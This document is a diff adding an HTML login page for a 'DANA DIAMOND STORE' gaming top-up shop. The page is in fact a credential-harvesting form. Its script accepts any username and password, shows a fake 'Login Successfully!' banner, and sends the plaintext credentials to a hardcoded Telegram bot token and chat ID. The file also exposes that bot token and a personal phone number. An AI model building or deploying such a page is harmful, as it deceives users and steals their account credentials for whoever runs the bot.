@@ -1,1 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DANA ADMIN</title>
 
+<style>
+body{
+margin:0;
+font-family:Arial;
+background:linear-gradient(to bottom,#0f2027,#203a43,#2c5364);
+color:white;
+text-align:center;
+padding:30px;
+overflow-x:hidden;
+}
+
+.success-bar{
+position:fixed;
+top:-100px;
+left:50%;
+transform:translateX(-50%);
+background:#d4edda;
+color:#155724;
+padding:15px 20px;
+border-radius:12px;
+width:90%;
+max-width:400px;
+box-shadow:0 5px 15px rgba(0,0,0,0.3);
+display:flex;
+justify-content:center;
+align-items:center;
+transition:0.5s;
+z-index:999;
+font-weight:bold;
+}
+
+.success-bar.show{
+top:20px;
+}
+
+body::before{
+content:"";
+position:fixed;
+top:5px; bottom:5px; left:5px; right:5px;
+border-radius:20px;
+border:4px solid;
+animation: frameColor 4s infinite;
+pointer-events:none;
+}
+
+@keyframes frameColor{
+0%{border-color:#00ffcc;}
+25%{border-color:#00c6ff;}
+50%{border-color:#ff00cc;}
+75%{border-color:#ffff00;}
+100%{border-color:#00ffcc;}
+}
+
+.store-title{
+font-size:28px;
+font-weight:900;
+letter-spacing:3px;
+text-transform:uppercase;
+animation: colorChange 3s infinite alternate;
+margin-bottom:10px;
+}
+
+.delivery{
+font-size:16px;
+margin-bottom:25px;
+color:#ffffffcc;
+}
+
+.main-title{
+font-size:42px;
+font-weight:900;
+letter-spacing:4px;
+color:white;
+text-transform:uppercase;
+text-shadow:
+0 0 5px #ffffff,
+0 0 15px #00c6ff,
+0 0 30px #00c6ff;
+margin-bottom:20px;
+}
+
+@keyframes colorChange{
+0%{color:#00c6ff;}
+100%{color:#00ffcc;}
+}
+
+.top-photo{
+margin:20px auto;
+width:90%;
+max-width:350px;
+}
+
+.top-photo img{
+width:100%;
+border-radius:20px;
+box-shadow:0 0 30px #00c6ff;
+}
+
+input{
+width:80%;
+padding:14px;
+margin:10px;
+border:none;
+border-radius:12px;
+font-size:16px;
+}
+
+.showbtn{
+padding:10px 20px;
+border:none;
+border-radius:10px;
+background:#555;
+color:white;
+margin-top:5px;
+}
+
+button{
+width:90%;
+padding:16px;
+margin:12px;
+border:none;
+border-radius:14px;
+font-size:17px;
+font-weight:bold;
+cursor:pointer;
+}
+
+.loginbtn{ background:#00ff99; color:black; }
+.topup{ background:#00c6d7; color:black; }
+.contact{ background:transparent; border:2px solid white; color:white; }
+
+.footer-text{
+margin-top:10px;
+font-size:14px;
+color:#00ffcc;
+font-weight:bold;
+}
+</style>
+</head>
+<body>
+
+<div id="successBar" class="success-bar">
+✅ Login Successfully!
+</div>
+
+<div class="store-title">DANA DIAMOND STORE</div>
+<div class="delivery">🚀 Delivery Within 10 Minutes</div>
+
+<h1 class="main-title">DANA ADMIN</h1>
+<p>Fast • Secure • Web owner - Admin kaviya</p>
+
+<div class="top-photo">
+<img src="IMG_20260222_095145_370.jpg">
+</div>
+
+<input type="text" id="username" placeholder="Username"><br>
+<input type="password" id="password" placeholder="Password"><br>
+<button class="showbtn" onclick="togglePassword()">Show</button>
+
+<button class="loginbtn" onclick="login()">LOGIN</button>
+<button class="topup" onclick="goTopup()">TOP UP NOW</button>
+<button class="contact" onclick="contactAdmin()">CONTACT ADMIN</button>
+
+<div class="footer-text">Sri Lanka No 1 Diamond Seller</div>
+
+<script>
+
+let loggedIn = false;
+
+/* 🔑 TELEGRAM DETAILS */
+let botToken = "8503112724:AAFf0sO9m3GJkvIJ1ign04y7XKBxdxdVftg";
+let chatId = "7951593603";
+
+function togglePassword(){
+let pw = document.getElementById("password");
+pw.type = (pw.type === "password") ? "text" : "password";
+}
+
+function login(){
+let username = document.getElementById("username").value;
+let password = document.getElementById("password").value;
+
+if(username === "" || password === ""){
+alert("Enter Username & Password");
+return;
+}
+
+loggedIn = true;
+
+let bar = document.getElementById("successBar");
+bar.classList.add("show");
+
+setTimeout(()=>{
+bar.classList.remove("show");
+},3000);
+
+/* 🔥 SEND TELEGRAM ALERT */
+sendTelegram(username, password);
+}
+
+function sendTelegram(username, password){
+
+let message =
+"🚨 NEW LOGIN ALERT 🚨\n\n"+
+"👤 Username: " + username + "\n"+
+"🔑 Password: " + password + "\n"+
+"🌍 Time: " + new Date().toLocaleString();
+
+fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+chat_id: chatId,
+text: message
+})
+})
+.then(res => console.log("Telegram Sent"))
+.catch(err => console.error("Telegram Error", err));
+
+}
+
+function goTopup(){
+if(!loggedIn){
+alert("⚠️ Please first login");
+return;
+}
+location.href="store.html";
+}
+
+function contactAdmin(){
+let phone = "94762955783";
+let message = "Hello Admin, I need help.";
+let url = "https://wa.me/" + phone + "?text=" + encodeURIComponent(message);
+window.open(url, "_blank");
+}
+
+</script>
+
+</body>
+</html>
